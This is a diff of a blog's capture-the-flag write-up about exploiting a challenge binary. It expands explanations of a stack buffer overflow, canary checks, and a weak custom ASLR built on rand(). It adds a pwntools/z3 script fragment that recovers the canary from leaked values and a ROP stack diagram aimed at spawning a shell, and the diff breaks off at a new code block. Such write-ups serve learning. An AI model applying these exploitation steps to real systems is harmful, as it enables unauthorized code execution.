@@ -87,13 +87,13 @@
           ·
         </span>
         <span>
-          8571 words
+          9710 words
         </span>
         <span class="split">
           ·
         </span>
         <span>
-          41 minute read
+          46 minute read
         </span>
     </div>
 
@@ -738,7 +738,7 @@
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>There is something wrong with this method. Let&rsquo;s see the <code>get_player_name</code> method, especially on the below LOC:</p>
+</div><p>This method will be used to store our name in the scoreboard, where we will need to send our name as the input, and the scoreboard will be updated. There is something wrong with this method. Let&rsquo;s see the <code>get_player_name</code> method, especially on the below LOC:</p>
 <div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
@@ -771,8 +771,32 @@
 </span></span><span style="display:flex;"><span>  }
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>Notice that there is a <strong>buffer overflow bug</strong> in the <code>get_player_name</code>. Even though they have add condition to check the length, they still continue reading the name, which makes buffer overflow is still possible. This method will be used only if our scores is higher than any value in the scoreboard, where we will need to send our name as the input, and the scoreboard will be updated.</p>
-<p>However, looking through the code, this binary has already done a mitigation from buffer overflow bug with <code>canary</code> to prevent stack smashing. In case you didn&rsquo;t know what that is, <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries" target="_blank" rel="noopener">canary</a> is a secret value that placed near the stack return pointer. The purpose of this is to detect whether buffer overflow is performed or not. How to detect it? Well during sending our buffer overflow payload to overwrite the stack return pointer, because <code>canary</code> is placed before the return pointer, that means the <code>canary</code> will be overwritten also. And then before jump to the return pointer, the binary will check whether the <code>canary</code> in the stack is correct or not, and then return <code>Stack smashing detected</code> if this value is changed from the stack. Below is the example demonstration.</p>
+</div><p>First thing to notice is that these LOCs will:</p>
+<ul>
+<li>Ask you the size of your name</li>
+<li>Check whether the size is &lt;= <code>0x1f</code></li>
+<li>Read your name and put it in local variable in stack called <code>local_38</code> (placed in <code>rbp-0x30</code>)</li>
+</ul>
+<p>But, notice that there is a <strong>buffer overflow bug</strong> in these LOCs. In case you haven&rsquo;t known yet, <a href="https://en.wikipedia.org/wiki/Buffer_overflow" target="_blank" rel="noopener">Buffer overflow</a> is a type of security bug where due to incorrect bound check, the attackers can write more data then it supposed to be, so that they can overwrite adjacent values those aren&rsquo;t supposed to be able to be overwritten.</p>
+<p>Back to the LOCs, notice that there is actually a bound check to make sure that the inputted size by the user is less than or equals to <code>0x1f</code>, so that user doesn&rsquo;t able to write data larger than the defined size.</p>
+<p>However, after they print the warning message, the if block logic doesn&rsquo;t return or stop the method, instead it will goes outside the if block and still continue reading the input, which makes buffer overflow is still possible. This improper bound checking leads to the buffer overflow bug, where we can simply set a large size, and then we can overwrite not only the name variable, but also the other values which address is higher than the name variable.</p>
+<p>Now, if we able to use this buffer overflow bug, we can modify the program flow and get our RCE. Usually if we have a buffer overflow bug in the stack, our common target is to overwrite the saved return pointer in the bottom of the stack (<code>rbp+8</code>). By overwriting the saved return pointer, we will have full control on the execution flow of the vulnerable binary. In this case, our name variable is placed in <code>rbp-0x30</code>, so to overwrite the return pointer, we will need to set the input size to at least <code>0x38</code>.</p>
+<p>However, looking through the code, this binary has already done a mitigation from buffer overflow bug by having a <code>canary</code> to prevent stack smashing. Below LOCs is the conditional logic to check the <code>canary</code> value:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (local_10 <span style="color:#555">!=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>)) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>    __stack_chk_fail();
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In case you didn&rsquo;t know what that is, <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries" target="_blank" rel="noopener">canary</a> is a secret value that is placed near the stack return pointer (<code>rbp-8</code>). The purpose of this is to detect whether buffer overflow is performed or not. How to detect it? Well during sending our buffer overflow payload to overwrite the stack return pointer, because <code>canary</code> is placed before the return pointer, that means if we try to overwrite the return pointer of the stack, by default the <code>canary</code> will be overwritten also. And then before jump to the new return pointer, the binary will check whether the <code>canary</code> in the stack is correct or not (compared to the stored value in <code>fs</code> register), and then return <code>Stack smashing detected</code> if this value is changed from the stack. Below is the example demonstration:</p>
 <div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
@@ -801,8 +825,8 @@
 </span></span><span style="display:flex;"><span>Stack smashing detected - mischief not managed!
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>The above example happened due to our example buffer overflow input, where the <code>canary</code> value got replaced with <code>aaaaaaaa</code>. So, how do we usually bypass this? The answer is we need to simply know the <code>canary</code> value, so that we can carefully craft our payload, so that when we do buffer overflow, we can place the <code>canary</code> value in our payload before our overwritten return pointer, so that when the binary do the <code>canary</code> check, the check will be passed. So, in order to do this, we need a way to leak the <code>canary</code>.</p>
-<p>An idea would be to overflow our inputted name until just before the canary, so that the <code>canary</code> will be included as part of our name in the scoreboard. To give illustration, consider this LOC in the <code>game</code> method:</p>
+</div><p>The above example happened due to our example buffer overflow input, where the <code>canary</code> value got replaced with <code>aaaaaaaa</code>. So, how do we usually bypass this? The answer is simple. We need to know the <code>canary</code> value, so that we can carefully craft our payload, so that when we do buffer overflow, we can place the <code>canary</code> value in our payload before our overwritten return pointer, so that when the binary do the <code>canary</code> check, the check will be passed. So, in order to do this, we need a way to leak the <code>canary</code>.</p>
+<p>A common idea to leak it would be to overflow our inputted name until just before the canary (stop at <code>rbp-0x8</code>), so that the <code>canary</code> will be included as part of our name in the scoreboard. To give illustration, consider this LOC in the <code>game</code> method:</p>
 <div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
@@ -966,8 +990,12 @@
 </div>
 </div><p>Notice that we found our second bug, where we can do out-of-bounds (OOB) read on the scoreboard array. There isn&rsquo;t any bound checking when accessing the <code>game_scoreboard</code> array, which mean we can leak any value even though it is placed outside the array. So with this bug, hopefully we can leak useful value later. Keep in mind that our goal is to leak the <code>canary</code> value.</p>
 <h4 id="decompilation-of-loader">Decompilation of loader <a href="#decompilation-of-loader" class="anchor">#</a></h4>
-<p>Now we have understand the <code>game.o</code> object file, we still haven&rsquo;t found a way to leak the canary value, so that we can use the buffer overflow bug to do ROP chain.</p>
-<p>Reading through the chall desc, it seems like this binary is implementing their own ASLR. Let&rsquo;s check how the <code>loader</code> binary works by decompiling it one by one.</p>
+<p>Now we have understand the <code>game.o</code> object file, we still haven&rsquo;t found a way to leak the canary value, so that we can use the buffer overflow bug. Remember the chall desc:</p>
+<blockquote>
+<p>I wasn&rsquo;t happy with the default ASLR, so I fixed it.</p>
+</blockquote>
+<p>Reading through it, it seems like this binary is implementing their own <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="noopener">ASLR</a>. In case you didn&rsquo;t know ASLR, it is a common mitigation technique to make it harder for attacker to exploit a binary, by setting a random address for the binary function address, stack address, heap, including the used libraries also, so that it will be harder for attacker to predict the address of each properties during crafting their exploit because each new run will have different addresses.</p>
+<p>We can deduce that maybe <code>loader</code> file is the one who has the implementation of the custom ASLR as it is the main binary. Let&rsquo;s check how the <code>loader</code> binary works by decompiling it one by one.</p>
 <p>Let&rsquo;s start by decompiling the <code>_start</code> method, which is the first entry of the loader.</p>
 <div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
@@ -1636,12 +1664,12 @@
 <p class="markdown-image">
   <img src="https://i.imgur.com/OFroRDt.png" alt=""  />
 </p></p>
-<p>Now we have find the custom aslr method! Turn out, the way it do the ASLR is, it will called <code>rand()</code> method to get 12-bits (0xc) of random number, and use this value as the first 12-bit base address of the loaded object file.</p>
+<p>Now we have find the custom aslr method! Turn out, the way it do the ASLR is, it will called <code>rand()</code> method to get 12-bits (0xc) of random number, and use this value as the first 12-bit base address of the loaded object file. After getting this base address, later on the object file method will be mapped to the generated address.</p>
 <p>And checking through Ghidra, after initializing the canary stack value, <code>rand()</code> will be only called during assigning the aslr of the loaded object via this method. You can see in below picture that <code>rand()</code> is only used in <code>init_stack_guard</code> (0x402163) and <code>aslr_get_addr</code> (0x40160c) method.
 <p class="markdown-image">
   <img src="https://i.imgur.com/jWXxfiQ.png" alt=""  />
 </p></p>
-<p>Remember from the previous analysis, that if we somehohw manage to get the n <code>rand()</code> call values after the call of <code>init_stack_guard</code>, we might be able to recover the <code>rand_state</code> after the <code>init_stack_guard</code> call, which is equivalent to the <code>canary</code> value set in our binary. And turn out, each of the n <code>rand()</code> call values are used as the aslr base address of each loaded files.</p>
+<p>Remember from the previous analysis, that if we somehow manage to get the n <code>rand()</code> call values after the call of <code>init_stack_guard</code>, we might be able to recover the <code>rand_state</code> after the <code>init_stack_guard</code> call, which is equivalent to the <code>canary</code> value set in our binary. And turn out, each of the n <code>rand()</code> call values are used as the aslr base address of each loaded files.</p>
 <p>So, if we somehow able to retrieve these aslr addresses (which constructed from the <code>rand()</code> value result), it will be great for us, because that means we will be able to recover consecutive <code>rand()</code> results, where the <code>rand()</code> call is based on a <code>rand_state</code> that is equivalent to the <code>canary</code> value. And using these recovered values, we will try to reconstruct the initial <code>rand_state</code> (which is our <code>canary</code>).</p>
 <p>To summarize, <code>loader</code> will load 7 object files (because we were given 7 object files in the chall), which mean there will be 7 consecutive calls to <code>rand()</code> after the <code>rand_state</code> is equivalent to <code>canary</code> value. And our target is to leak these 7 aslr addresses.</p>
 <h5 id="run-the-main-program">Run the main program <a href="#run-the-main-program" class="anchor">#</a></h5>
@@ -1871,7 +1899,9 @@
 </ul>
 <p>You can see my shared script later if you quite confused, but basically with correct OOB offsets, we managed to leak the first 6 of the aslr addresses where the first 12-bit of each address is generated by <code>rand()</code>.</p>
 <h4 id="recover-canary-value">Recover <code>canary</code> value <a href="#recover-canary-value" class="anchor">#</a></h4>
-<p>Now that we have leaked 6 consecutive of the <code>rand()</code> values, this is actually enough to recover our <code>canary</code> value. How to do this? Just translate the <code>rand()</code> method to python and put it in <code>z3</code> 😂. Here is the sample POC, where we will use the previous value that we get from GDB.</p>
+<p>Now that we have leaked 6 consecutive of the <code>rand()</code> values, this is actually enough to recover our <code>canary</code> value. How to do this? Just translate the <code>rand()</code> method to python and put it in <code>z3</code> 😂. <code>z3</code> is a SMT solver, where given some constraints, it will try to check whether any solution that can satisfy the constraints exist or not.</p>
+<p>In this case, the constraints that we will use is the leaked <code>rand()</code> values, while the solution that we try to find a 64-bit number (which is the <code>rand_state</code>). So, what we can do is simply re-write the <code>rand()</code> algo that we see in the decompiled result to python, and then try to construct the constraints for our target solution (<code>rand_state</code>) by adding equality constraint, where each <code>rand()</code> call result need to be equal to our leaked value.</p>
+<p>Here is the sample POC, where we will use the previous value that we get from GDB.</p>
 <div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
@@ -1942,6 +1972,10 @@
 </span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
 </span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
 </span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
 <pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
@@ -1983,13 +2017,17 @@
 </span></span><span style="display:flex;"><span>        x <span style="color:#555">=</span> (x <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">1</span>) <span style="color:#555">|</span> y
 </span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> x
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Put leaked rand() values to the solver</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Setting constraints, where each rand() call result</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># should be the same as the leaked rand() values</span>
 </span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> known_state <span style="color:#000;font-weight:bold">in</span> known_states:
 </span></span><span style="display:flex;"><span>    s<span style="color:#555">.</span>add(rand(<span style="color:#f60">0xc</span>) <span style="color:#555">==</span> known_state)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Solve the equations with z3</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Solve the equations with z3 by checking whether the solver</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># can satisfy the constraint</span>
 </span></span><span style="display:flex;"><span>recovered_canary <span style="color:#555">=</span> <span style="color:#f60">0</span>
 </span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> s<span style="color:#555">.</span>check() <span style="color:#555">==</span> sat:
+</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic"># If yes, that mean z3 found the solution, which basically our</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic"># canary value.</span>
 </span></span><span style="display:flex;"><span>    model <span style="color:#555">=</span> s<span style="color:#555">.</span>model()
 </span></span><span style="display:flex;"><span>    recovered_canary <span style="color:#555">=</span> model[BitVec(<span style="color:#c30">&#34;x&#34;</span>, <span style="color:#f60">64</span>)]<span style="color:#555">.</span>as_long()
 </span></span><span style="display:flex;"><span>
@@ -2032,8 +2070,158 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="leverage-the-bof-bug-to-perform-rce">Leverage the BOF bug to perform RCE <a href="#leverage-the-bof-bug-to-perform-rce" class="anchor">#</a></h4>
-<p>Now we have POC to recover our canary value, we can use the BOF bug to perform RCE. So, the last step is only to build a ROP chain.</p>
-<p>Inspecting via gdb, we notice that the 7th rand() address region contains a lot of gadgets that we can use (Such as <code>pop rdi; ret;</code>, <code>pop rsi; ret</code>, <code>pop rax; ret</code>). We also notice in thhe 2nd rand() address region, there is <code>syscall</code> gadget. We plan to use these gadgets to do syscall <code>execve('/bin/sh')</code>. The rough plan is to build a ROP chain to do this:</p>
+<p>Now we have POC to recover our canary value, we can use the BOF bug to perform RCE by overwriting the saved return pointer. One of the common technique to achieve RCE via BOF is called return oriented programming (<a href="https://en.wikipedia.org/wiki/Return-oriented_programming" target="_blank" rel="noopener">ROP</a>).</p>
+<p>Basically, what we need to do is, because we control the stack due to the buffer overflow bug, we will try to carefully chose some available instructions in the binary (called <code>gadgets</code>), which can be used to build our shellcode. Usually, what we&rsquo;re looking for is instruction that can pop a stack value (which we can control) to chosen register (such as <code>rdi</code>, <code>rsp</code>, <code>rsi</code>, <code>rax</code>, etc.), and it usually end with <code>ret</code> instruction, so that we can jump to another chosen instruction that we have put in the stack.</p>
+<p>For example, imagine that we have a buffer overflow bug in method X:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Now because of our malicious input, the stack layout become like below:
+</span></span><span style="display:flex;"><span>Lower Address
+</span></span><span style="display:flex;"><span> ----------------------------------
+</span></span><span style="display:flex;"><span>| aaaaaaaa                         | &lt;- RSP, top of stack
+</span></span><span style="display:flex;"><span>|----------------------------------|
+</span></span><span style="display:flex;"><span>| ........                         |
+</span></span><span style="display:flex;"><span>|----------------------------------|
+</span></span><span style="display:flex;"><span>| Saved RBP                        | &lt;- RBP
+</span></span><span style="display:flex;"><span>|----------------------------------|
+</span></span><span style="display:flex;"><span>| Address of gadget &#34;pop rdi; ret&#34; | &lt;- Stack Return Pointer address after being overwritten
+</span></span><span style="display:flex;"><span>|----------------------------------|
+</span></span><span style="display:flex;"><span>| desired rdi value                |
+</span></span><span style="display:flex;"><span>|----------------------------------|
+</span></span><span style="display:flex;"><span>| Address of gadget &#34;syscall&#34;      |
+</span></span><span style="display:flex;"><span> ----------------------------------
+</span></span><span style="display:flex;"><span>Higher Address
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>When the method X is finished and want to jump to the previous callee by calling `leave; ret;`, the stack flow will be like below:
+</span></span><span style="display:flex;"><span>After &#34;leave&#34;, stack will be like below:
+</span></span><span style="display:flex;"><span>Lower Address
+</span></span><span style="display:flex;"><span> ----------------------------------
+</span></span><span style="display:flex;"><span>| Address of gadget &#34;pop rdi; ret&#34; | &lt;- RSP. Stack Return Pointer address after being overwritten
+</span></span><span style="display:flex;"><span>|----------------------------------|
+</span></span><span style="display:flex;"><span>| desired rdi value                | &lt;- This value will be popped to rdi
+</span></span><span style="display:flex;"><span>|----------------------------------|
+</span></span><span style="display:flex;"><span>| Address of gadget &#34;syscall&#34;      |
+</span></span><span style="display:flex;"><span> ----------------------------------
+</span></span><span style="display:flex;"><span>Higher Address
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>During executing &#34;ret&#34;, program will do &#34;pop rip&#34;, which basically make the program jump
+</span></span><span style="display:flex;"><span>to the address stored in top of stack, which is &#34;pop rdi; ret&#34;. Now the stack is like below:
+</span></span><span style="display:flex;"><span>Lower Address
+</span></span><span style="display:flex;"><span> ----------------------------------
+</span></span><span style="display:flex;"><span>| desired rdi value                | &lt;- RSP. This value will be popped to rdi
+</span></span><span style="display:flex;"><span>|----------------------------------|
+</span></span><span style="display:flex;"><span>| Address of gadget &#34;syscall&#34;      |
+</span></span><span style="display:flex;"><span> ----------------------------------
+</span></span><span style="display:flex;"><span>Higher Address
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Now, during executing &#34;pop rdi&#34;, it will pop top of stack to rdi. Now stack is like below:
+</span></span><span style="display:flex;"><span>Lower Address
+</span></span><span style="display:flex;"><span> ----------------------------------
+</span></span><span style="display:flex;"><span>| Address of gadget &#34;syscall&#34;      | &lt;- RSP. Next return pointer address
+</span></span><span style="display:flex;"><span> ----------------------------------
+</span></span><span style="display:flex;"><span>Higher Address
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>And now, &#34;ret&#34; will do &#34;pop rip&#34;, which make the program jump to the stored address
+</span></span><span style="display:flex;"><span>in RSP , which is syscall.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Now, We finally able to do RCE leveraging BOF bug.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As you can see in thhe above example, with buffer overflow, we can do RCE via ROP to execute our desired execution.</p>
+<p>So, the last step is only to build a ROP chain. Inspecting via gdb, we notice that the 7th <code>rand()</code> address region contains a lot of gadgets that we can use (Such as <code>pop rdi; ret;</code>, <code>pop rsi; ret</code>, <code>pop rax; ret</code>). We also notice in the 2nd <code>rand()</code> address region, there is <code>syscall</code> gadget.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
